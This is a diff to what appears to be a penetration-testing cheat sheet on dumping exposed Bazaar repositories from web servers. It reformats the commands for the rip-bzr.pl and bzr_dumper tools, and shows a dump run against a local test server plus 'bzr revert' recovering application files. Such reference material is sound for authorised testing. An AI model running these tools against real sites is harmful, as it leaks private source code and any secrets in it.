@@ -15,15 +15,16 @@
 
 ### rip-bzr.pl
 
-```powershell
-wget https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
-docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
-```
+* [kost/dvcs-ripper/rip-bzr.pl](https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl)
+    ```powershell
+    docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u
+    ```
 
 ### bzr_dumper
 
+* [SeahunOh/bzr_dumper](https://github.com/SeahunOh/bzr_dumper)
+
 ```powershell
-git clone https://github.com/SeahunOh/bzr_dumper
 python3 dumper.py -u "http://127.0.0.1:5000/" -o source
 Created a standalone tree (format: 2a)
 [!] Target : http://127.0.0.1:5000/
@@ -38,8 +39,10 @@ Created a standalone tree (format: 2a)
 [+] GET branch/tag
 [+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
 [*] Finish
+```
 
-$ bzr revert
+```powershell
+bzr revert
  N  application.py
  N  database.py
  N  static/
